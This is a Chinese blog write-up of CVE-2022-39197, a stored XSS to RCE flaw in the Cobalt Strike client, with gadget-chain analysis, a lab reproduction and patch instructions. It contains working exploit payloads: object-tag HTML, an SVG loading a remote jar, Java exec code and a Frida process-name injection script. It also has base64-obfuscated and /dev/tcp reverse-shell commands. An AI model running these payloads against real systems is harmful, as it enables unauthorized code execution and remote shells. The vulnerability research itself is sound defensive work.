---
title: CobaltStrike 存储型XSS-RCE（CVE-2022-39197)
date: 2023-3-15 20:00:34
tags: 漏洞分析
category: 渗透测试
---

## 0.cs简介

Cobalt Strike (CS) 是一个为对手模拟和红队行动而设计的平台，相当于增强版的Armitage，早期以Metasploit为基础框架，3.0版本之后作为独立平台开发，主要用于目标攻击和模拟后渗透行动。CS集成了端口转发、服务扫描、端口监听、木马生成、钓鱼攻击等功能，可以调用Mimikatz、Psexec等工具，与MSF进行联动，使用插件扩展功能，并且可以利用Malleable C2 profile 自定义通信流量特征，是内网大杀器，十分适合作为团队协同攻击工具使用

Cobalt Strike使用C/S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互

## 1.漏洞原因

由于Cobalt Strike 使用 GUI 框架 SWING开发，未经身份验证的远程攻击者可通过在 beacon 元数据中注入恶意 HTML 标签，使得CS对其进行解析时加载恶意代码，从而在目标系统上执行任意代码实现rce

即==》攻击者在Beacon配置中设置格式错误的用户名，借此实现 实现远程执行代码



漏洞危害：  

​	1.用户获取到使用Cobalt Strike的攻击者的木马样本后，反制正在使用 Cobalt Strike 客户端的攻击者

​	2.导致命令执行，服务器被入侵

​	3.内网被渗透，导致数据被窃取等风险



影响版本：Cobalt Strike <= 4.7



修补：

==》升级版本之后即避免漏洞产生，也可以通过打补丁方式防御漏洞：https://github.com/burpheart/CVE-2022-39197-patch

启动客户端的时候加入agent参数防止渲染html,具体原理参考后文



官方通报：

https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/



## 2.漏洞原理

参考：

> [漂亮鼠大佬复现](https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098978&idx=1&sn=d511d5a674d84eeaf262c8e389ae0403&scene=21#wechat_redirect)
>
> [最新CS RCE（CVE-2022-39197）复现心得分享](https://www.freebuf.com/vuls/347221.html)
>
> https://cloud.tencent.com/developer/article/2220765
>
> https://forum.butian.net/share/1934
>
> https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ?ref=www.ctfiot.com
>
> https://www.shangyexinzhi.com/article/5240616.html
>
> https://xz.aliyun.com/t/11815#toc-5

### 2.1 Swing的XSS漏洞源码分析

Swing解析HTML标签原理流程：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221647108.png" alt="Swing解析HTML标签流程图" style="zoom:50%;" />



具体解析细节：Swing规定：开头引入`<html>`标签就会对其中内容进行HTML渲染解析，测试JLabel的setText()方法设置标签内容为HTML代码，能实现在标签中显示图片:

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221650435.png" alt="Swing的HTML特性" style="zoom:50%;" />





​	1）分析Swing源码，JDK的运行环境文件rt.jar，分析javax-swing-text-html包，javax代表“Java扩展”

​	2）查看HTML类：定义了一些标签和属性常量。使用HTML标签属性作为参数，实例化多个Tag对象并存储在allTags数组中

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231746185.png" alt="HTML类里定义的标签" style="zoom:50%;" />

​	3）HTMLDocument类：定义了一系列标签对应的Action，这些Action用于处理HTML文档中的标签，例如插入图片、插入超链接等

​	4）HTMLEditorKit类：将HTML文本输出为可编辑文本，根据传入的参数（即不同的标签）创建一个对应的HTML元素对象，并将传入的属性和内容设置到该元素对象中。例如，如果传入的标签名是"div"，则该方法会创建一个div元素对象，并将传入的属性和内容设置到该对象中。该方法返回创建的HTML元素对象

​	5）HiddenTagView类：一种特殊的视图对象，用于隐藏标签，如`<input type="hidden">`，不会显示在界面中

​	6）HTMLEditorKit类中处理script标签:解析html时，虽然HTML类定义了script标签**但不会执行Java Script代码**，即并不能引入外部js文件实现常规的Java Script XSS（跨站脚本漏洞），而是直接隐藏，不会解析

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221653426.png" alt="HTMLEditorKit类中对script标签的处理" style="zoom:50%;" />



### 2.2 XSS到实例化任何类

漏洞里实例化任何类入口的源码逻辑图：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221656007.png" alt="实例化任何类入口的源码逻辑" style="zoom:50%;" />

具体研究细节：

​	分析HTML类定义的OBJECT标签和HTMLDocument.HTMLReader定义的ObjectAction。HTMLEditorKit会返回ObjectView类。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231742641.png" alt="HTMLEditorKit类解析不同标签" style="zoom:50%;" />

​	

​	ObjectView类：在HTML文档中显示对象，将数据对象呈现为Swing组件。ObjectView尝试加载分类属性指定的object。如果类可以成功加载，将尝试通过调用class.new实例来创建它的实例。即ObjectView是一个用于创建符合特定要求的类实例的工具，它可以通过参数传递来初始化这些实例，**类似反序列化的功能**。**<u>那么，通过使用object标签，我们可以实现动态实例化符合要求的类，并通过param标签传递参数，从而实现任意加载</u>**。基于这个入口，这种方法不仅可以用于加载图片，还可以应用于实例化 任意类的场景。**同时，该类声明了object标签使用模版：**

```
<object classid="javax.swing.JLabel">
<param name="text" value="sample text">
</object>
```

漏洞入口ObjectView类的部分源码：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231739952.png" alt="漏洞入口ObjectView类的部分源码" style="zoom:50%;" />



调用原理：

​	1）ObjectView类里的源码：这里获取当前元素的属性集合，然后从属性集合中获取CLASSID属性的值。接着使用Java反射机制加载该类，并创建一个实例对象，并通过调用setParameters设置参数。这个类必须有无参的构造方法且类继承于Component类，否则抛出异常。

​	2）setParameters方法源码分析：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231751208.png" alt="setParameters方法的部分源码" style="zoom:50%;" />



​	方法需要两个参数：<u>一个Component对象和一个AttributeSet对象</u>。首先，获取组件的类信息，然后获取该类的所有属性的描述器数组，接着，它遍历属性描述器数组，取出所有属性参数然后循环判断哪些属性参数和标签传入值一致。如果找到了匹配的属性参数，它会将该参数的值转换为字符串，并尝试调用属性描述器的写方法来设置组件的属性值。如果属性不可写或者参数数量不止一个且不为string，它会忽略该标签传入值。最后反射执行对应方法。

​	3）怎么判断属性是否可写：通过看它是否有对应的set方法，如一个属性是Name，那就看这个类有没有setName方法



​	**总结下来ObjectView类要求**：

(1)通过参数classid传入需要实例化的类，类必须继承于Component。

(2)类必须有无参构造方法。

(3)类属性可写，即属性必须存在一个对应的set方法。

(4)set方法的参数必须是一个string类型。



​	而**JLabel**：是Java Swing中的一个类，用于在GUI（图形用户界面）上显示文本或图像，继承于Component。JLabel不需要任何参数来创建对象，有无参数构造方法：public JLabel() {this("", null, LEADING);}。并且有text属性和需要String参数的setText方法，满足ObjectView类要求：public void setText(String text)。

​	那么尝试构造：

`<html><object classid='javax.swing.JLabel'><param name='Text' value='test'>`

​	执行效果如图:

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231753207.png" alt="JLabel的object注入" style="zoom:50%;" />



​	JLabel的setText()方法可以实现object注入，**但只能用于设置标签的文本内容**。它接受一个字符串参数，该字符串将被显示在标签上，只能用于显示静态的文本信息，并不会解析执行代码，如JavaScript代码。

​	后续研究方向：从lib包里寻找符合条件的类和方法以最终实现执行远程代码

### 2.3 寻找RCE利用链



​	在需要满足类继承于Component、包含无参的构造方法、类中有一个set方法，该方法只接受一个String类型的参数的条件下，分析得出Swing本身的库满足以上条件的大多为<u>参数预处理功能</u>，与代码执行无关

​	继而分析Cobalt Strike源码jar包，发现org.apache.batik.swing.JSVGCanvas类的setURI方法配合漏洞可以实现远程代码执行

​	Apache Batik是一个开源的SVG工具包，它提供了一组Java类库，用于处理SVG文档、转换SVG文档为其他格式（如PNG、JPEG等）、显示SVG文档等。而org.apache.batik.swing.JSVGCanvas是一个Java Swing组件，用于显示和操作可缩放矢量图形（SVG）文件

​	<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231755913.png" alt="JSVGCanvas类的setURI方法" style="zoom:50%;" />



​	1）JSVGCanvas类其中的setURI方法接受一个字符串类型参数var1。这个方法实际上是用来设置uri属性的。将uri属性设置为传递进来的var1参数。如果uri不为null，就调用loadSVGDocument方法加载传入的SVG文档。那这个setURI方法的可控输入就为SVG文档

​	2）而SVG文档是一种基于xml的矢量图形格式，用于描述二维图形和动画。它可以在各种设备和平台上显示，并且**可以通过CSS和JavaScript进行样式和交互控制**

​	3）虽然SVG文档支持JavaScript，**但这里Cobalt Strike环境不能执行JavaScript代码**，执行报错，分析在batik.bridge.BaseScriptingEnvironment.loadScripts函数，👇

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231756440.png" alt="loadScripts类部分源码" style="zoom:50%;" />



**发现所需条件**：

(1)type需为application/java-archive

(2)String href = XLinkSupport.getXLinkHref(script);读取namespaceURL为http://www.w3.org/1999/xlink的href属性的内容，如果没读到，这里href的值为空字符串。

(3)getBaseURI()用来获取SVG数据源的URL，作为参数传给ParsedURL对象。

(4)checkCompatibleScriptURL：实际调用DefaultScriptSecurity方法，要求远程SVG文件和远程jar包地址host相同。

(5)DocumentJarClassLoader是URLClassLoader的封装，URLClassLoader的作用是加载远程jar包。第一个参数指定了远程jar包的地址，实际为创建ParsedURL对象时的第二个参数href，即xlink:href属性内容。

(6)远程jar包需包含META-INF/MANIFEST.MF文件，且其中Script-Handler的值为需要远程加载类的类名。

(7)getMainAttributes()方法返回该Jar文件的主清单文件的Attributes对象，getValue("Script-Handler")方法返回该Attributes对象中名为"Script-Handler"的属性的值，也就是类名，将其赋值给变量var13。

(8)变量var26将动态加载类var13，并实例化为ScriptHandler类型的对象。那么由于var13可控，那么我们就可以通过这种方式来构造远程代码执行

​	那么准备SVG文件：
```
<svg xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink"
    version="1.0">
<script type="application/java-archive" xlink:href="http://xxx/evil.jar"/>
<text>xxx</text> </svg>
```
准备实现远程代码执行功能的恶意jar包，测试功能：针对不同系统弹出计算器，代码如下
```
import java.io.IOException;
public class Exp {
    public Exp() throws IOException {
        String os = System.getProperty("os.name").toLowerCase();
        if(os.indexOf("mac")>=0){
            Runtime.getRuntime().exec("open -na Calculator");
        }else if(os.indexOf("windows")>=0){
            Runtime.getRuntime().exec("calc.exe");
        }else {Runtime.getRuntime().exec("calc.exe");}}}
```
payload：
```
<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name= 'URI' value='http://xxx/test.svg'>
```

**那么总结RCE调用链流程图如下👇**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231801157.png" alt="RCE利用链流程图" style="zoom:50%;" />

### 2.4 反制原理

​	Cobalt Strike会话上线的beacon元数据里的用户名、主机名、操作系统信息等都是有长度限制的，由RSA加密，且能修改的部分只有user、computer、process字段，想要插入有效`<html>`标签的payload，可以从后续通信的AES数据入手，beacon和teamserver之间的通信分为两个阶段，第一个阶段是上线包的RSA加密，第二个阶段是后续命令下发的AES加密。在第二个阶段中，我们可以注入进程名称数据来绕过元数据的长度限制，进行XSS攻击，进一步实现远程代码执行。

​	而注入进程名可以通过Python的Frida实现(Frida是一种动态插桩工具，可以在运行时修改和监视应用程序的行为。多用于应用程序的逆向工程、漏洞分析、安全测试等方面)。当攻击者试图对会话执行列出进程，反制者通过Frida注入应用程序修改返回的进程名称为精心构造的payload，攻击者浏览到该进程名，远程代码执行则会实现

​	1) exp Python文件关键代码：
```
pid = frida.spawn(target)  
session = frida.attach(pid) 
script = session.create_script(frida_script) 
script.load() 
frida.resume(pid)
frida.kill(pid)
```
​	使用Frida库在设备上启动一个进程，并返回该进程的进程ID（PID）。target 是要启动的进程的名称或者路径。然后attach连接这个运行的进程。这个函数会返回一个 session，表示与目标进程的连接会话。通过这个会话，在目标进程中执行JavaScript代码，或者使用Frida提供的API来进行各种操作。这里将Frida脚本加载到目标进程，使目标进程开始执行Frida脚本中的代码，最后终止该进程

​	2)Frida部分脚本代码:
```
var pProcess32Next = Module.findExportByName("kernel32.dll", "Process32Next") 
Interceptor.attach(pProcess32Next, {
        onEnter: function(args) {
            this.pPROCESSENTRY32 = args[1];
            if(Process.arch == "ia32"){this.exeOffset = 36;}else{this.exeOffset = 44;}
            this.szExeFile = this.pPROCESSENTRY32.add(this.exeOffset);},
        onLeave: function(retval) {
            if(this.szExeFile.readAnsiString() == "beacon.exe") {
                send("[!] Found beacon, injecting payload");
                this.szExeFile.writeAnsiString(payload);}}})
```

​	在kernel32.dll模块中查找并获取Process32Next函数的地址，并将其赋值给变量pProcess32Next。Process32Next函数是Windows系统中的一个API函数，用于枚举进程信息。Frida中使用这个函数来获取正在运行的进程的信息。然后用Interceptor.attach()方法拦截函数调用。

​	然后根据当前进程的架构（32位或64位）来设置偏移量的值。不同架构的操作系统，可执行文件在PE文件格式中的偏移量不同。接着根据偏移量定位可执行文件名称。Windows系统的进程信息结构体PROCESSENTRY32中的szExeFile成员变量存储了进程的可执行文件名称，那么获取该成员的地址并将其赋值给变量this.szExeFile。

​	通过readAnsiString() 方法读取进程的可执行文件名称。判断是否为“beacon.exe”。如果是，则使用this.szExeFile.writeAnsiString(payload)将payload注入到该进程中，最后使用send函数将注入操作的结果发送给Frida客户端。【后续也可将文件名设置为变量】

​	3）**总结**：EXP通过在 Windows 操作系统中拦截 Process32Next 函数的调用，并在进程列表中查找名为beacon.exe的进程，如果找到了该进程，就会注入进程，修改进程名为payload代码


## 3.漏洞复现



参考：

> [简单复现](https://mp.weixin.qq.com/s?__biz=MzkyMDE4NzE1Mw==&mid=2247484355&idx=1&sn=1d2df2c1eac378875fe1c0d408478979&scene=21#wechat_redirect)
>
> [简单2](https://mp.weixin.qq.com/s/1FUvdOqmDPcFptlfkDk-rg)
>
> poc:   https://github.com/its-arun/CVE-2022-39197
>
> https://blog.csdn.net/qq_50854662/article/details/129181019



### 3.1 漏洞自查

​	受该漏洞影响的版本:Cobalt Strike <= 4.7
​	连接Cobalt Strike服务端，启动Cobalt Strike客户端。
​	客户端配置监听器，名称处输入以下代码： 

```
<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name= 'URI' value='http://xxx/a.svg'></object>
```

​	代码含义：创建一个SVG画布对象。classid属性指定要使用的Java类库，这里是Apache Batik的SVG画布类org.apache.batik.swing.JSVGCanvas。这个类库可以在Java应用程序中显示和操作SVG图像。`<param>`标记用于传递参数给SVG画布对象，这里的参数是SVG图像的URL地址， URI value处设置为DNSlog地址，查看DNSlog记录判断Cobalt Strike能否远程访问，**注意：这里的URI必须以http://开头否则Swing无法解析地址,如图**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231810438.png" alt="SVG解析地址报错" style="zoom:50%;" />



1）payload选项默认，这里用dnslog原理测试漏洞是否存在

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021828187.png" alt="配置监听器" style="zoom:50%;" />



2）点击保存，客户端会触发HTTP访问，查看DNSlog是否有访问记录即可判断是否有漏洞，<u>这里本地Cobalt Strike存在该漏洞</u>

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021828841.png" alt="本地自查Cobalt Strike存在漏洞" style="zoom:50%;" />



3）进一步本地验证能否触发远程代码执行漏洞：名称处的URI value修改为本地端口9898搭建的SVG文件地址。

```
<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name= 'URI' value='http://127.0.0.1:9898/evil.svg'></object>
```

4）提前准备的SVG文件内容：表示一个SVG图像，其中SVG脚本元素包含一个指向一个jar包的超链接，并将其作为脚本引入SVG图形中，SVG被触发会访问远程jar包

```
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" xmlns:xlink ="http://www.w3.org/1999/xlink"><script type="application/java-archive" xlink:href= "http://127.0.0.1:9898/EvilJar-mac-calc.jar"> </script> </svg>
```

5）EvilJar-mac-calc.jar：弹出计算器，<u>本地漏洞成功实现代码执行</u>

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021830741.png" alt="本地利用漏洞实现代码执行" style="zoom:50%;" />

### 3.2 反制复现

cs服务端：vps centos：1.xxx.172

攻击者：mac，10.211.55.2 

受害者：虚拟机win，10.211.55.3

实现结果：受害者运行马，攻击者mac上的客户端上线，同时mac被反制弹出计算器



1.编辑恶意文件内容

编辑EvilJar\src\main\java\Exploit.java，更改第19行代码参数为rce命令例如弹出计算器

目标为win时的命令：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241524024.png" alt="x" style="zoom:50%;" />

为mac的命令：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303282357968.png" alt="image-20230328235735922" style="zoom: 33%;" />



2.java编译，生成jar文件：在右侧的Maven栏目中，在Lifecycle中点击package，运行maven构建

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241602900.png" alt="自定义jar包" style="zoom: 33%;" />



(这里使用eclipse进行编译的话：

​	菜单栏点击File -> 选择Export导出 -> 选择java文件夹 -> 选择底下的JAR file -> next之后在新的界面选择项目Eviljar -> browser浏览生成的位置 -> finish即可生成jar文件。将其置于serve路径下)

![image-20230328111753975](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281117552.png)

3.木马文件(exe)要和poc py文件置于同一路径下

4.在server路径下启动web服务==》满足目标能访问

```
python -m http.server --bind 0.0.0.0 9898
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281118179.png" alt="image-20230328111843140" style="zoom: 33%;" />



5.编辑在此文件夹下的evil.svg文件，将[attacker]替换为当前路径启用的web地址【虚拟机win上开启web服务，mac可以访问】（不同测试忘换图，这里图里href ip应该为win端ip10.211.55.3）

![x](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241612951.png)



6.cs客户端生成网页马

​	win伪装成受害者下载网页马beacon.exe

7.win执行poc py文件，cs客户端看到马上线后查看用户进程时，自己界面被弹出计算器

```
python cve-2022-39197.py beacon.exe http://10.211.55.3:9898/evil.svg
```

![执行poc](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290005652.png)



<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281645298.png" alt="目标上线" style="zoom: 25%;" />



这时cs客户端进程名已被污染

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281646669.png" alt="cs客户端进程名被污染" style="zoom: 25%;" />

​	

​	**当滚动进程列表进行查看当前会话所在进程名时即触发，请求攻击者web服务上的evil.svg文件，而evil.svg文件又继续加载请求恶意文件EvilJar-1.0-jar-with-dependencies.jar，成功执行命令，从而达到RCE**

​	反制者收到cs端请求：

![请求](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290008049.png)

​	

​	cs端被执行命令：

![被反制](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290008935.png)



⚠️：

1.弹出计算器需等待一会

2.下线是因为poc 文件里设置等待100s后就会终止

3.马的名字必须与poc里的beacon.exe一样，否则rce失败【当然后续都改为别的名字也可行】

改成任意名字都可以：（py文件里line27）

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303301338977.png" alt="image-20230330133839485" style="zoom: 33%;" />



### 3.3 进一步反制复现测试

mac本地开启cs服务端、客户端

```
cd /Users/romanc9/software/cs/cobaltstrike4.3
sudo ./teamserver 10.211.55.2 123456
./start.sh

java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M - javaagent:CSAgent.jar=3a4425490f389aeec312bdd758ad2b99 -Duser.language=en -jar cobaltstrike.jar
```

【复现成功，前面失败可能：jar文件不是mac的弹计算器，而是win的】

cs server+客户端：mac

攻击机：mac：10.211.55.2

受害者/反制者：虚拟机win10：10.211.55.6

生成mac calc恶意jar

![image-20230419013934659](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190139739.png)







生成web后门

![image-20230418104955614](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181049670.png)

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181050120.png" alt="image-20230418105008045" style="zoom:50%;" />

```
http://10.211.55.2:80/beacon.exe
```



靶机win下载木马

![image-20230418105111924](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181051006.png)

​	经测试，因虚拟机win10和mac都是arm64系统，所以经mac编译的exe文件虚拟机win10可运行，那么可直接生成exe文件复制粘贴而无需网页马



win执行exp

![image-20230419011651757](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304191055371.png)



mac cs客户端被反制

![image-20230419011537847](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190115930.png)



即使断开连接了还能弹出计算器

![image-20230419012208085](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190122144.png)



删除会话也是，只要停留在这个进程页面都会弹，但必须是鼠标滚动到出现恶意进程名才会弹，鼠标停留在正常进程名字不会弹

![image-20230419012332945](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190123022.png)



同时反制者也能观察到记录，但都没有访问jar的记录

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190128491.png" alt="访问记录" style="zoom:50%;" />



这时修改恶意jar包/删除/移动还是能弹，怀疑cs本地存在缓存/在加载恶意名的时候即下载恶意jar到本地了

把http服务关闭后就不会再弹了，显示502网关错误

![报错](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190137207.png)



## 4.漏洞防御&补丁

防御办法：升级版本/打补丁

**--更新版本：**

​	4.7.1版本已将新属性添加到TeamServer.prop文件（位于TeamServer的主文件夹中）：imits.beacons_xssvalidated指定是否对选定的beacon元数据执行XSS验证。默认情况下设置为true



**--官方补丁**：https://github.com/burpheart/CVE-2022-39197-patch



​	补丁原理：<u>通过在Cobalt Strike客户端启动时修改javax.swing.plaf.basic.BasicHTML类的isHTMLString方法，以禁用Swing框架的HTML支持功能</u>



补丁使用方法

​	(1)下载patch.jar包，将patch.jar放入Cobalt Strike启动目录下，即与cobaltstrike.jar同一目录。

​	(2)在Cobalt Strike客户端启动参数中加入javaagent 启用补丁

```
-javaagent:patch.jar
```

​	(3)启动Cobalt Strike输出Successfully Patched. 即为补丁启用成功。**经测试，如果只有服务端启动补丁，Cobalt Strike客户端不启动补丁，还是存在漏洞。**



<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021850336.png" alt="客户端不打补丁的漏洞利用" style="zoom:50%;" />



​	(4)当Cobalt Strike客户端启动补丁，漏洞则不会触发，HTML代码会直接输出出来作为纯文本

​	客户端加上补丁启动：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021851817.png" alt="客户端加上补丁启动" style="zoom:50%;" />



​	客户端文字输出HTML：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021851138.png" alt="客户端文字输出HTML" style="zoom:50%;" />

## 5.思考问题

分析该漏洞的时候，需明确几个节点



1.Cobalt Strike漏洞与swing的关系

2.漏洞是怎么从xss到rce的

3.漏洞触发条件是攻击者查看用户进程吗，原理？

4.代码攻击链怎么形成的





## 6.踩坑/注意事项🚩

1.*mac m1 下生成的 shell , x86 运行上不了线*  ==>网页马可以解决

<u>建议 cs 全套都在 x86 的机器上弄</u>

> https://cn-sec.com/archives/1544546.html

```
PS:
mac本机开启服务端、客户端，不管是http、https后门exe，虚拟win都无法上线
后门换成网页马，win下载运行exe可以上线
```

cs网页马形式：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303301445459.png" alt="网页马" style="zoom:50%;" />



但若都是arm机器：测试时可以直接鼠标拖拽运行上线



2.报错：

​	frida与python版本报错：https://blog.csdn.net/song_lee/article/details/105102108【Building wheel for frida】

​	也就是要单独下载适配系统、python版本whl包安装即可：https://blog.csdn.net/weixin_34722995/article/details/70043392?fps=1&locationNum=2、https://pypi.org/project/frida/16.0.2/#history

```
使用如下命令查看，查看当前平台支持的版本【https://blog.csdn.net/t18438605018/article/details/121769227】

pip debug --verbose
```



3.如何关闭frida

> 如果是在命令行模式下使用Frida，可以使用Ctrl+C组合键来终止正在运行的程序，并关闭Frida。 如果是在Python脚本中使用Frida，可以使用`sys.exit()`命令来关闭Frida。 如果正在使用Frida的GUI应用程序，可以在该应用程序中的“File”菜单中找到“Exit”选项来关闭Frida。 无论使用哪种方法来关闭Frida，都应确保所有Frida进程和插件已经停止，并释放所有相关资源，确保系统安全和稳定。

​	

4.在Python脚本中使用Frida，运行失败如何关闭frida

> 如果在Python脚本中使用Frida运行失败，可以手动关闭Frida来结束它的运行，步骤如下： 
>
> 1. 打开终端或命令行窗口。 
> 2. 输入"ps -ef | grep frida"命令，查找当前运行的Frida进程ID。
> 3. 输入"kill 接下来加上Frida进程ID"命令，强制结束Frida进程。 如果使用的是Windows系统，则可以通过任务管理器来结束Frida进程。打开任务管理器，找到Frida进程，右键点击它，选择结束进程即可。
> 4. 注意，结束Frida进程会导致Frida脚本中的操作被取消，如果需要继续使用Frida，请检查原因并尝试修复问题。

**经测试，若中途出现任务无法响应的情况，直接任务管理器结束任务即可，测试出现的frida报错导致无法启动frida的情况只能靠重启电脑实现，怀疑是缓存原因导致**



5.除了基础测试漏洞的弹出计算器，还可进一步测试rce：

> 反弹shell
>
> https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/
>
> https://xz.aliyun.com/t/5257
>
> https://www.cnpanda.net/codeaudit/759.html  
>

```
java命令:
Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMy8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}");

bash命令：
bash -i >& /dev/tcp/192.168.3.3/1234 0>&1
```



6.注意测试时Windows运行马时可以开启简单杀软避免defener误删

> https://github.com/Tlaster/YourAV



7.运行poc py文件之前先安装依赖，由于我这遇到了问题就贴出来最后解决的命令

```
pip install -r requirements.txt -i http://pypi.douban.com/simple --trusted-host pypi.douban.com --no-cache-dir
```



## 延伸参考

https://nvd.nist.gov/vuln/detail/CVE-2021-36798

张慧琳,邹维,韩心慧.网页木马机理与防御技术[J].软件学报,2013,24(04):843-858.

刘晨,李春强,丘国伟.基于Cobalt Strike和Office漏洞的入侵者反制研究[J].网络空间安全,2018,9(01):56-61.

Strategic Cyber Cobalt Strike[J].SC magazine,2014,25(2):44-44





















